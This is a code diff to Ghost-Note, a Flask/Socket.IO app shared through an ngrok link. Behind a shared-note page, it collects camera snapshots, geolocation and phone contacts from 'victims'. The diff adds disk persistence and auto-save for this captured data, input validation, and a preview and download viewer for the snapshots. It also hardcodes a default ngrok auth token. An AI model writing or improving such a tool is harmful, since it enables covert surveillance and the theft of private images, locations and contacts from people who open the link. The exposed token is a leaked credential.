@@ -5,7 +5,11 @@ Ghost-Note - A themed, recon-capable Note Sharing Application
 import os
 import sys
 import subprocess
+import json
+import threading
+import atexit
 from datetime import datetime
+from pathlib import Path
 from flask import Flask, render_template_string, request
 from flask_socketio import SocketIO, emit
 
@@ -14,10 +18,219 @@ app = Flask(__name__)
 app.config['SECRET_KEY'] = os.urandom(24)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
+# Data persistence paths
+DATA_DIR = Path('data')
+NOTES_FILE = DATA_DIR / 'notes.json'
+CAPTURES_FILE = DATA_DIR / 'captures.json'
+CONTACTS_FILE = DATA_DIR / 'contacts.json'
+
+DATA_DIR.mkdir(exist_ok=True)
+
 # In-memory store
 captured_data = []
 active_notes = {}
 connected_victims = {}
+contacts_data = []
+
+# Persistence control
+_auto_save_lock = threading.Lock()
+_auto_save_enabled = True
+
+
+# ── Persistence Functions ──────────────────────────────────────────────────────
+
+def save_notes():
+  """Persist active notes to JSON file."""
+  try:
+    with open(NOTES_FILE, 'w') as f:
+      json.dump(active_notes, f, indent=2, default=str)
+  except Exception as e:
+    print(f"[!] Error saving notes: {e}")
+
+
+def save_captures():
+  """Persist captured data to JSON file."""
+  try:
+    with open(CAPTURES_FILE, 'w') as f:
+      json.dump(captured_data, f, indent=2, default=str)
+  except Exception as e:
+    print(f"[!] Error saving captures: {e}")
+
+
+def save_contacts():
+  """Persist contacts data to JSON file."""
+  try:
+    with open(CONTACTS_FILE, 'w') as f:
+      json.dump(contacts_data, f, indent=2, default=str)
+  except Exception as e:
+    print(f"[!] Error saving contacts: {e}")
+
+
+def save_all():
+  """Save all in-memory data to disk."""
+  with _auto_save_lock:
+    save_notes()
+    save_captures()
+    save_contacts()
+
+
+def load_data():
+  """Load all persistent data from JSON files."""
+  global captured_data, active_notes, contacts_data
+
+  if NOTES_FILE.exists():
+    try:
+      with open(NOTES_FILE, 'r') as f:
+        active_notes.update(json.load(f))
+      print(f"[+] Loaded notes from {NOTES_FILE}")
+    except Exception as e:
+      print(f"[!] Error loading notes: {e}")
+
+  if CAPTURES_FILE.exists():
+    try:
+      with open(CAPTURES_FILE, 'r') as f:
+        captured_data = json.load(f)
+      print(f"[+] Loaded {len(captured_data)} captures from {CAPTURES_FILE}")
+    except Exception as e:
+      print(f"[!] Error loading captures: {e}")
+
+  if CONTACTS_FILE.exists():
+    try:
+      with open(CONTACTS_FILE, 'r') as f:
+        contacts_data = json.load(f)
+      print(f"[+] Loaded {len(contacts_data)} contact records from {CONTACTS_FILE}")
+    except Exception as e:
+      print(f"[!] Error loading contacts: {e}")
+
+
+def start_auto_save(interval=30):
+  """Start background auto-save thread."""
+  def auto_saver():
+    while _auto_save_enabled:
+      try:
+        threading.Event().wait(interval)
+        if _auto_save_enabled:
+          save_all()
+      except Exception as e:
+        print(f"[!] Auto-save error: {e}")
+
+  thread = threading.Thread(target=auto_saver, daemon=True)
+  thread.start()
+  print(f"[+] Auto-save enabled ({interval}s interval)")
+
+
+def graceful_shutdown():
+  """Save all data before exit."""
+  global _auto_save_enabled
+  _auto_save_enabled = False
+  print("\n[*] Saving all data before shutdown...")
+  save_all()
+  print("[+] Shutdown complete")
+
+
+atexit.register(graceful_shutdown)
+
+
+# ── Input Validation ───────────────────────────────────────────────────────────
+
+class ValidationError(Exception):
+  """Input validation error."""
+  pass
+
+
+def validate_camera_snap(data):
+  """Validate camera snapshot data."""
+  if not isinstance(data, dict):
+    raise ValidationError("Data must be a dict")
+
+  image = data.get('image')
+  if not image or not isinstance(image, str):
+    raise ValidationError("Invalid image")
+
+  if len(image) > 10 * 1024 * 1024:  # 10MB max
+    raise ValidationError("Image too large (max 10MB)")
+
+  if not image.startswith('data:image/'):
+    raise ValidationError("Invalid image format")
+
+  return {'image': image}
+
+
+def validate_location_data(data):
+  """Validate geolocation data."""
+  if not isinstance(data, dict):
+    raise ValidationError("Data must be a dict")
+
+  result = {}
+
+  if 'lat' in data:
+    lat = data['lat']
+    if not isinstance(lat, (int, float)) or not (-90 <= lat <= 90):
+      raise ValidationError("Invalid latitude")
+    result['lat'] = lat
+
+  if 'lng' in data:
+    lng = data['lng']
+    if not isinstance(lng, (int, float)) or not (-180 <= lng <= 180):
+      raise ValidationError("Invalid longitude")
+    result['lng'] = lng
+
+  if 'acc' in data:
+    acc = data.get('acc')
+    if isinstance(acc, (int, float)) and acc >= 0:
+      result['acc'] = acc
+
+  return result
+
+
+def validate_contacts_data(data):
+  """Validate contacts data."""
+  if not isinstance(data, dict):
+    raise ValidationError("Data must be a dict")
+
+  contacts = data.get('contacts')
+  if not isinstance(contacts, list) or len(contacts) > 1000:
+    raise ValidationError("Invalid contacts list")
+
+  validated = []
+  for c in contacts:
+    if not isinstance(c, dict):
+      raise ValidationError("Each contact must be a dict")
+
+    validated_contact = {}
+    if 'name' in c:
+      name = c['name']
+      if isinstance(name, str) and len(name) <= 255:
+        validated_contact['name'] = name
+
+    if 'tel' in c:
+      tel = c['tel']
+      if isinstance(tel, list) and len(tel) <= 20:
+        validated_contact['tel'] = [str(t)[:50] for t in tel if isinstance(t, (str, int))]
+
+    validated.append(validated_contact)
+
+  return {'contacts': validated}
+
+
+def validate_note_update(data):
+  """Validate note update data."""
+  if not isinstance(data, dict):
+    raise ValidationError("Data must be a dict")
+
+  result = {}
+
+  if 'title' in data:
+    title = data['title']
+    if isinstance(title, str) and len(title) <= 500:
+      result['title'] = title
+
+  if 'content' in data:
+    content = data['content']
+    if isinstance(content, str) and len(content) <= 100000:
+      result['content'] = content
+
+  return result
 
 # ── HTML Templates ────────────────────────────────────────────────────────────
 
@@ -242,6 +455,53 @@ SENDER_PANEL = '''<!DOCTYPE html>
   }
   .snap-img:hover { transform: scale(1.02); border-color: var(--accent); }
 
+  .preview-modal {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.86);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 24px;
+    z-index: 9999;
+  }
+  .preview-modal.open { display: flex; }
+  .preview-modal img {
+    max-width: min(1100px, 95vw);
+    max-height: 88vh;
+    border-radius: 10px;
+    border: 1px solid var(--border);
+    background: #000;
+    object-fit: contain;
+  }
+  .preview-controls {
+    position: absolute;
+    top: 16px;
+    right: 16px;
+    display: flex;
+    gap: 10px;
+  }
+  .preview-btn {
+    width: 36px;
+    height: 36px;
+    border: 1px solid var(--border);
+    border-radius: 999px;
+    background: rgba(17, 17, 24, 0.9);
+    color: var(--text);
+    font-size: 18px;
+    cursor: pointer;
+    line-height: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 0.2s;
+  }
+  .preview-btn:hover {
+    background: rgba(17, 17, 24, 1);
+    border-color: var(--accent);
+    color: var(--accent);
+  }
+
   .empty-state {
     color: var(--muted);
     font-family: 'JetBrains Mono', monospace;
@@ -335,6 +595,14 @@ SENDER_PANEL = '''<!DOCTYPE html>
   </div>
 </main>
 
+<div id="previewModal" class="preview-modal" onclick="closePreview(event)">
+  <div class="preview-controls">
+    <button class="preview-btn" aria-label="Download image" onclick="downloadImage(event)" title="Download">⬇</button>
+    <button class="preview-btn" aria-label="Close preview" onclick="closePreview(event)" title="Close">×</button>
+  </div>
+  <img id="previewImage" alt="Preview">
+</div>
+
 <script>
 const socket = io();
 let snapshots = [];
@@ -411,9 +679,54 @@ function renderSnaps() {
     img.className = 'snap-img';
     img.src = s.image;
     img.title = `${s.ip} — ${s.time}`;
-    img.onclick = () => window.open(s.image, '_blank');
+    img.onclick = () => openPreview(s.image, `${s.ip} — ${s.time}`);
     grid.appendChild(img);
   });
+}
+
+function openPreview(src, title='Preview') {
+  const modal = document.getElementById('previewModal');
+  const image = document.getElementById('previewImage');
+  image.src = src;
+  image.alt = title;
+  modal.classList.add('open');
+  document.body.style.overflow = 'hidden';
+}
+
+function closePreview(event) {
+  if (event) {
+    event.preventDefault();
+    event.stopPropagation();
+  }
+  const modal = document.getElementById('previewModal');
+  if (!modal.classList.contains('open')) return;
+  modal.classList.remove('open');
+  const image = document.getElementById('previewImage');
+  image.src = '';
+  document.body.style.overflow = '';
+}
+
+document.addEventListener('keydown', (event) => {
+  if (event.key === 'Escape') {
+    closePreview();
+  }
+});
+
+function downloadImage(event) {
+  if (event) {
+    event.preventDefault();
+    event.stopPropagation();
+  }
+  const image = document.getElementById('previewImage');
+  if (!image.src) return;
+  
+  const link = document.createElement('a');
+  link.href = image.src;
+  link.download = 'snapshot-' + new Date().getTime() + '.jpg';
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+  log('DL', 'Image downloaded');
 }
 
 function updateTargets() {
@@ -600,74 +913,84 @@ def handle_update_note(data):
     """
     Handles the 'update_note' event to update and broadcast the note content.
     """
+    try:
+        validated = validate_note_update(data)
+    except ValidationError as e:
+        emit('error', {'message': str(e)})
+        return
+
     note_id = 'main_note'
     active_notes[note_id] = {
-        'title': data.get('title', 'Shared Note'),
-        'content': data.get('content', ''),
+        'title': validated.get('title', 'Shared Note'),
+        'content': validated.get('content', ''),
         'time': datetime.utcnow().isoformat()
     }
+    save_notes()
     emit('note_updated', active_notes[note_id], broadcast=True)
+
 
 @socketio.on('camera_snap')
 def handle_camera_snap(data):
     """
     Receives a camera snapshot and broadcasts it to the sender.
     """
+    try:
+        validated = validate_camera_snap(data)
+    except ValidationError as e:
+        emit('error', {'message': str(e)})
+        return
+
     ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
     snap_data = {
-        'image': data['image'],
+        'image': validated['image'],
         'ip': ip_addr,
         'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     }
+    captured_data.insert(0, snap_data)
+    save_captures()
     emit('camera_snap', snap_data, broadcast=True)
+
 
 @socketio.on('location_data')
 def handle_location_data(data):
     """
     Receives location data and broadcasts it to the sender.
     """
-    emit('location_data', data, broadcast=True)
+    try:
+        validated = validate_location_data(data)
+    except ValidationError as e:
+        emit('error', {'message': str(e)})
+        return
+
+    ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
+    location_payload = {
+        **validated,
+        'ip': ip_addr,
+        'time': datetime.now().isoformat()
+    }
+    emit('location_data', location_payload, broadcast=True)
+
 
 @socketio.on('contacts_data')
 def handle_contacts_data(data):
     """
     Receives contacts data and broadcasts it to the sender.
     """
+    try:
+        validated = validate_contacts_data(data)
+    except ValidationError as e:
+        emit('error', {'message': str(e)})
+        return
+
     ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
     contacts_bundle = {
-        'contacts': data['contacts'],
-        'ip': ip_addr
+        'contacts': validated['contacts'],
+        'ip': ip_addr,
+        'timestamp': datetime.now().isoformat()
     }
+    contacts_data.append(contacts_bundle)
+    save_contacts()
     emit('contacts_data', contacts_bundle, broadcast=True)
-
-@socketio.on('disconnect')
-def on_disconnect():
-    sid = request.sid
-    if sid in connected_victims:
-        emit('target_disconnected', {'id': sid}, broadcast=True)
-        connected_victims.pop(sid, None)
-
-@socketio.on('camera_snap')
-def on_snap(data):
-    data['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
-    data['time'] = datetime.now().strftime('%H:%M:%S')
-    emit('camera_snap', data, broadcast=True)
-
-@socketio.on('location_data')
-def on_location(data):
-    data['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
-    emit('location_data', data, broadcast=True)
-
-@socketio.on('contacts_data')
-def on_contacts(data):
-    data['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
-    emit('contacts_data', data, broadcast=True)
-
-@socketio.on('update_note')
-def on_update_note(data):
-    active_notes['current'] = data
-    # Push the update to all connected targets
-    emit('note_updated', data, broadcast=True, include_self=False)
 
 # ── Ngrok & Main Execution ────────────────────────────────────────────────────
 
@@ -690,6 +1013,13 @@ if __name__ == '__main__':
     NGROK_AUTH_TOKEN = os.environ.get("NGROK_AUTH_TOKEN", "3Ba1JTw9PJmH5zQ75udVA8Bba32_4Lc9RouPuScqwVVjDqZPS")
 
     print("[*] Starting GhostNote...")
+
+    # Load persistent data from previous sessions
+    load_data()
+
+    # Start auto-save background thread
+    start_auto_save(interval=30)
+
     ngrok_url = start_ngrok(PORT, NGROK_AUTH_TOKEN)
 
     if not ngrok_url:
@@ -702,27 +1032,10 @@ if __name__ == '__main__':
     print(f"  SHARE: {ngrok_url}/note")
     print("="*60 + "\\n")
 
-    def run_socketio_server():
-        """Run Socket.IO with compatibility for different Flask/Werkzeug versions."""
-        try:
-            socketio.run(
-                app,
-                host='0.0.0.0',
-                port=PORT,
-                debug=False,
-                allow_unsafe_werkzeug=True,
-            )
-        except TypeError:
-            # Older Flask/Werkzeug versions do not support allow_unsafe_werkzeug.
-            socketio.run(app, host='0.0.0.0', port=PORT, debug=False)
-
-    # Use eventlet or gevent for better performance with socketio
-    try:
-        import eventlet
-        eventlet.monkey_patch()
-        print("[*] Using eventlet for async mode.")
-        run_socketio_server()
-    except ImportError:
-        print("[!] Warning: eventlet not found. Performance may be limited.")
-        print("[!] Install with: pip install eventlet")
-        run_socketio_server()
+    socketio.run(
+        app,
+        host='0.0.0.0',
+        port=PORT,
+        debug=False,
+        allow_unsafe_werkzeug=True,
+    )
